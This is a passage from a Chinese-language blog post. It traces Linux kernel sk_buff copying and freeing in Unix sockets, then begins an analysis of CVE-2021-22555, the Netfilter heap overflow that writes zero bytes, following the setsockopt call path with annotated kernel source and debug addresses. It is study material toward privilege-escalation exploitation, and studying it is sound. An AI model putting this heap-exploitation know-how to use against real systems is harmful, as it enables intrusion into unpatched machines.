class="comment">//传输数据完成之后,skb-&gt;users从2改为1,表示已经复制完数据了,方便后续判断</span></span><br><span class="line">        <span class="comment">//消息中是否还有数据</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//修改skb类型转换之后对应的consumed字段,其实就是skb-&gt;cb某个位置处的数据</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据</span></span><br><span class="line">            <span class="comment">//有(1)则break,无(0)则进入后续的内存释放阶段</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------分叉二:内存释放</span></span><br><span class="line">            <span class="comment">//内存释放前置工作</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//进入该函数,通过对于skb-&gt;users的判断之后,进入内存释放阶段</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-数据复制"   >
          <a href="#A-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-数据复制" class="headerlink" title="A.数据复制"></a>A.数据复制</h5>
      <p>之后的函数调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>最终进入<code>__skb_datagram_iter</code>，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//这个header指的就是数据data,大概就是从这里开始实际的数据</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linux内核维护人员都看不下去了,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里使用了感觉很复杂的机制，不是很懂。</p>

        <h5 id="B-内存释放"   >
          <a href="#B-内存释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-内存释放" class="headerlink" title="B.内存释放"></a>B.内存释放</h5>
      <p>进入内存释放的函数调用链为</p>
<ul>
<li><p>释放<code>skb-&gt;data</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>对应函数如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//其实head和data是一样的</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用的正常的<code>kfree</code>函数</p>
</li>
<li><p>释放<code>skb</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>相关函数如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//克隆体相关的,没有fork之类的话一般不用太管的</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//用专门的cache(skbuff_head_cache)进行回收</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//用专门的cache(skbuff_fclone_cache)进行回收克隆的skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这个就不太好利用了。</p>
<p>同样的，当关闭的信道的两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放</p>
</li>
</ul>

        <h5 id="内存释放总结："   >
          <a href="#内存释放总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存释放总结：" class="headerlink" title="内存释放总结："></a>内存释放总结：</h5>
      <ul>
<li><p>当从信道中将某条消息全部读取完之后，会发生该条消息对应的<code>sk_buff</code>和<code>skb-&gt;data</code>的内存释放，且<code>sk_buff</code>释放到专门的缓存池中，<code>skb-&gt;data</code>使用正常的<code>kfree</code>释放</p>
</li>
<li><p>当关闭信道两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放，具体的调用链为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>后面就类似了。</p>
</li>
</ul>

        <h1 id="一、漏洞分析"   >
          <a href="#一、漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、漏洞分析" class="headerlink" title="一、漏洞分析"></a>一、漏洞分析</h1>
      
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>由于我编译环境的时候老是出问题（后面才解决的），所以直接拿<code>bsauce</code>师傅提供的环境来用了，但是又没有带DEBUG的<code>vmlinux</code>，所以我使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf.git" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>简单获取下符号就开始逆向了(xs)，所以下面漏洞分析提到的地址为<code>bsauce</code>师傅环境的地址。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027#h2-1" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>相关的<code>Netfilter</code>分析就不做了，也不太会，可以看看<code>bsauce</code>师傅的，这里主要关注数据的传输过程的一些东西。</p>
<p>通过<code>Netfilter</code>的<code>setsockopt</code>系统调用，传入用户数据<code>&amp;data</code>，可依据该<code>&amp;data</code>中的相关数据进行不同大小的堆块申请。完成申请后，还会对该堆块进行一定的处理，其中就有向堆块末尾填充数据的操作。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br></pre></td></tr></table></div></figure>

<p>其中<code>t-&gt;data+target-&gt;targetsize</code>即为申请的堆块上末尾处的某个地址，<code>pad</code>为如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br></pre></td></tr></table></div></figure>

<p>其实<code>pad</code>的值即为<code>8 - (target-&gt;targetsize mod 8)</code>，就是所谓的8字节对齐。</p>
<p>并且<code>t-&gt;data</code>的地址偏移和<code>target-&gt;targetsize</code>的值都可被我们直接或间接地控制，那么就可以存在堆块溢出写0的操作了，这里最多溢出4个字节填充为0。</p>
<p>下面是具体的关键函数调用链和相关分析</p>

        <h2 id="1-nf-setsockopt"   >
          <a href="#1-nf-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-nf-setsockopt" class="headerlink" title="1.nf_setsockopt()"></a>1.nf_setsockopt()</h2>
      <p>句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>这样到调用<code>setsockopt</code>系统调用时，就会调用到<code>do_ipt_get_ctl</code>函数。</p>

        <h2 id="2-do-ipt-set-ctl"   >
          <a href="#2-do-ipt-set-ctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-do-ipt-set-ctl" class="headerlink" title="2.do_ipt_set_ctl()"></a>2.do_ipt_set_ctl()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure>

<p>调试如下<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png" alt="image-20220501113945278"></p>
<p>这个<code>&amp;data</code>即为用户传入的，赋值给<code>sockptr_t arg</code>，从而依据<code>sockptr_t arg</code>来进行堆块申请和相关的漏洞填充操作。</p>
</li>
<li><p>地址：<code>0xffffffff81b0bd20</code></p>
</li>
<li><p>介绍：该函数由<code>nf_sockopt_ops ipt_sockopts</code>进行句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>即系统调用<code>setsockopt</code>实际调用到与漏洞方面有关的最早的函数，传入的<code>sockptr_targ</code>即为用户参数<code>&amp;data</code>，后续会调用到<code>compat_do_replace</code>，传入<code>sockptr_t arg</code></p>
</li>
</ul>

        <h2 id="3-compat-do-replace"   >
          <a href="#3-compat-do-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-compat-do-replace" class="headerlink" title="3.compat_do_replace()"></a>3.compat_do_replace()</h2>
      <p>通过<code>_copy_from_user</code>复制<code>&amp;data</code>的<code>0x5c</code>字节给<code>tmp</code></p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0baf0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">sockptr_t</span> arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> <span class="title">tmp</span>;</span><span class="comment">//保存size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>调用<code>translate_compat_table()</code>，传入本函数定义的<code>tmp</code>作为<code>compatr</code>，该变量<code>tmp</code>由函数<code>copy_from_sockptr(&amp;tmp, arg, sizeof(tmp))</code>进行赋值</p>
<ul>
<li>相关函数链：<code>copy_from_sockptr-&gt;copy_from_sockptr-&gt;copy_from_sockptr_offset-&gt;copy_from_user</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/sockptr.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">copy_from_sockptr_offset</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">sockptr_t</span> src,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!sockptr_is_kernel(src))</span><br><span class="line">		<span class="keyword">return</span> copy_from_user(dst, src.user + offset, size);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, src.kernel + offset, size);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>dst</code>即为<code>tmp</code>，<code>src</code>即为<code>arg</code>，也就是会依据<code>arg(&amp;data)</code>的内容来给<code>tmp</code>赋值。即最后的<code>compatr</code>的来源为上述提到的<code>sockptr_t arg</code>，也就是用户传入的参数<code>&amp;data</code>。</p>
<p>从<code>&amp;data</code>中复制<code>0x5c(sizeof(struct compat_ipt_replace))</code>大小的给到<code>tmp(compatr)</code>，如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    <span class="title">compat_do_replace</span><span class="params">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_sockptr(&amp;tmp, arg, <span class="keyword">sizeof</span>(tmp)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">///....</span></span><br><span class="line">    <span class="comment">//这里的tmp.size即为0xfb6，传入的data.replace.size，也是申请了堆块的。</span></span><br><span class="line">    <span class="comment">//不过这个堆块不用太过关注，但是这个不能随便设置，不然会在如下检查出错误</span></span><br><span class="line">    <span class="comment">//然后跳转out_unlock从而无法进入漏洞点</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //translate_compat_table函数中</span></span><br><span class="line"><span class="comment">    //Walk through entries, checking offsets. </span></span><br><span class="line"><span class="comment">	xt_entry_foreach(iter0, entry0, compatr-&gt;size) &#123;</span></span><br><span class="line"><span class="comment">		ret = check_compat_entry_size_and_hooks(iter0, info, &amp;size,</span></span><br><span class="line"><span class="comment">							entry0,</span></span><br><span class="line"><span class="comment">							entry0 + compatr-&gt;size);</span></span><br><span class="line"><span class="comment">		if (ret != 0)</span></span><br><span class="line"><span class="comment">			goto out_unlock;</span></span><br><span class="line"><span class="comment">		++j;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//需要注意的是这个newinfo和下面函数中的newinfo不是同一个</span></span><br><span class="line">    newinfo = xt_alloc_table_info(tmp.size);</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    ret = translate_compat_table(net, &amp;newinfo, &amp;loc_cpu_entry, &amp;tmp);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>复制的这些数据中就包含定义好的size，用来完成之后的堆块申请。</p>
</li>
</ul>

        <h2 id="4-translate-compat-table"   >
          <a href="#4-translate-compat-table" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-translate-compat-table" class="headerlink" title="4.translate_compat_table()"></a>4.translate_compat_table()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net,struct xt_table_info **pinfo,<span class="keyword">void</span> **pentry0,<span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0b3e0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> *<span class="title">compatr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"><span class="keyword">void</span> *pos, *entry1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_entry</span> *<span class="title">iter0</span>;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p><code>size</code>：<code>size = compatr-&gt;size;</code></p>
</li>
<li><p><code>newinfo</code>：依据<code>size</code>即上述的<code>compatr-&gt;size</code>申请堆块，漏洞点就出在这个申请的堆块上面。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">translate_compat_table(struct net *net,</span><br><span class="line">                       struct xt_table_info **pinfo,</span><br><span class="line">                       <span class="keyword">void</span> **pentry0,</span><br><span class="line">                       <span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    size = compatr-&gt;size;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//这个堆块就是漏洞堆块了。</span></span><br><span class="line">    newinfo = xt_alloc_table_info(size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过<code>xt_alloc_table_info</code>来申请堆块，其中有如下代码</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/netfilter/x_tables.c</span></span><br><span class="line"><span class="function">struct xt_table_info *<span class="title">xt_alloc_table_info</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sz = <span class="keyword">sizeof</span>(*info) + size;<span class="comment">//加上0x40大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sz &lt; <span class="keyword">sizeof</span>(*info) || sz &gt;= XT_MAX_TABLE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//实际申请的堆块大小为0xffe,即kmalloc-4096，这个堆块就是漏洞堆块了。</span></span><br><span class="line">    <span class="comment">//结构为struct xt_table_info</span></span><br><span class="line">	info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(*info));</span><br><span class="line">	info-&gt;size = size;</span><br><span class="line">	<span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用<code>kvmalloc</code>，申请标志为<code>GFP_KERNEL_ACCOUNT</code>，并且<code>XT_MAX_TABLE_SIZE</code>定义如下，也就是在kmalloc-512到kmalloc-8192</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define XT_MAX_TABLE_SIZE	(512 * 1024 * 1024)</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>pos/entry1</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry1 = newinfo-&gt;entries;</span><br><span class="line">pos = entry1;</span><br></pre></td></tr></table></div></figure>

<p>即<code>pos/entry1</code>的值为<code>newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)</code></p>
</li>
<li><p>调用如下函数进行下一步：</p>
